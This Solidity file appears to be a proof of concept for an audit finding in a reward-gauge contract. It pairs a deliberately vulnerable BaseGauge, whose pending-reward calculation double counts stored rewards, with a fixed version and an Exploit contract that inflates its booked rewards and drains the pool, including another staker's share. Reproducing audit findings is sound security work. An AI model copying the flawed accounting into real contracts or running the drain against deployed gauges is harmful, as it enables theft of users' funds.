// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum BaseGauge — Pashov 2025-05-06, finding 66159 (C-05).
    _calculatePendingRewards returns storedRewards + userShare. updateUserRewards
    then adds that sum onto rewards again. One 100-token accrual becomes
    100, then 200, then 400. claimRewards drains the 200-token pool, including
    the other staker's 100. The control returns only the new share and pays 100.
*/

contract Token {
    string public symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BaseGauge {
    Token public rewardToken;
    mapping(address => uint256) public rewardPerTokenStored;
    mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;
    mapping(address => mapping(address => uint256)) public rewards;
    mapping(address => uint256) public stakeOf;

    constructor(Token token) {
        rewardToken = token;
    }

    function seed(address user, uint256 stake, uint256 index, uint256 stored, uint256 paid) external {
        stakeOf[user] = stake;
        rewardPerTokenStored[address(rewardToken)] = index;
        rewards[address(rewardToken)][user] = stored;
        userRewardPerTokenPaid[address(rewardToken)][user] = paid;
    }

    function _pendingShare(address token, address user) internal view returns (uint256) {
        uint256 bal = stakeOf[user];
        uint256 paid = userRewardPerTokenPaid[token][user];
        uint256 idx = rewardPerTokenStored[token];
        if (idx <= paid || bal == 0) return 0;
        return (bal * (idx - paid)) / 1e18;
    }

    function _calculatePendingRewards(address token, address user) internal view returns (uint256) {
        uint256 storedRewards = rewards[token][user];
        uint256 userShare = _pendingShare(token, user);
        // @> VULN: pending already contains storedRewards, and the caller adds it onto rewards again
        return storedRewards + userShare;
    }

    function updateUserRewards() external {
        address token = address(rewardToken);
        uint256 pending = _calculatePendingRewards(token, msg.sender);
        if (pending > 0) {
            rewards[token][msg.sender] += pending;
            userRewardPerTokenPaid[token][msg.sender] = rewardPerTokenStored[token];
        }
    }

    function claimRewards() external {
        address token = address(rewardToken);
        uint256 amt = rewards[token][msg.sender];
        uint256 bal = Token(token).balanceOf(address(this));
        if (amt > bal) amt = bal;
        rewards[token][msg.sender] = 0;
        require(Token(token).transfer(msg.sender, amt), "pay");
    }
}

contract BaseGaugeFixed {
    Token public rewardToken;
    mapping(address => uint256) public rewardPerTokenStored;
    mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;
    mapping(address => mapping(address => uint256)) public rewards;
    mapping(address => uint256) public stakeOf;

    constructor(Token token) {
        rewardToken = token;
    }

    function seed(address user, uint256 stake, uint256 index, uint256 stored, uint256 paid) external {
        stakeOf[user] = stake;
        rewardPerTokenStored[address(rewardToken)] = index;
        rewards[address(rewardToken)][user] = stored;
        userRewardPerTokenPaid[address(rewardToken)][user] = paid;
    }

    function _pendingShare(address token, address user) internal view returns (uint256) {
        uint256 bal = stakeOf[user];
        uint256 paid = userRewardPerTokenPaid[token][user];
        uint256 idx = rewardPerTokenStored[token];
        if (idx <= paid || bal == 0) return 0;
        return (bal * (idx - paid)) / 1e18;
    }

    function updateUserRewards() external {
        address token = address(rewardToken);
        uint256 pending = _pendingShare(token, msg.sender);
        if (pending > 0) {
            rewards[token][msg.sender] += pending;
            userRewardPerTokenPaid[token][msg.sender] = rewardPerTokenStored[token];
        }
    }

    function claimRewards() external {
        address token = address(rewardToken);
        uint256 amt = rewards[token][msg.sender];
        rewards[token][msg.sender] = 0;
        require(Token(token).transfer(msg.sender, amt), "pay");
    }
}

contract Exploit {
    address public constant victim = address(uint160(0xBEEF));
    uint256 public constant ACCRUAL = 100 ether;

    Token public token;
    BaseGauge public gauge;
    uint256 public received;

    constructor() {
        token = new Token();
        gauge = new BaseGauge(token);
        gauge.seed(address(this), ACCRUAL, 1e18, 0, 0);
        gauge.seed(victim, ACCRUAL, 1e18, ACCRUAL, 1e18);
        token.mint(address(gauge), ACCRUAL * 2);
    }

    function run() external {
        gauge.updateUserRewards();
        uint256 bookedOnce = gauge.rewards(address(token), address(this));
        require(bookedOnce == ACCRUAL, "once");
        gauge.updateUserRewards();
        uint256 bookedTwice = gauge.rewards(address(token), address(this));
        require(bookedTwice == ACCRUAL * 2, "twice");
        gauge.updateUserRewards();
        uint256 bookedThrice = gauge.rewards(address(token), address(this));
        require(bookedThrice == ACCRUAL * 4, "thrice");
        uint256 beforeBal = token.balanceOf(address(this));
        gauge.claimRewards();
        received = token.balanceOf(address(this)) - beforeBal;
        require(received == ACCRUAL * 2, "drained");
        require(token.balanceOf(address(gauge)) == 0, "empty");
        require(gauge.rewards(address(token), victim) == ACCRUAL, "victim still owed");
    }
}
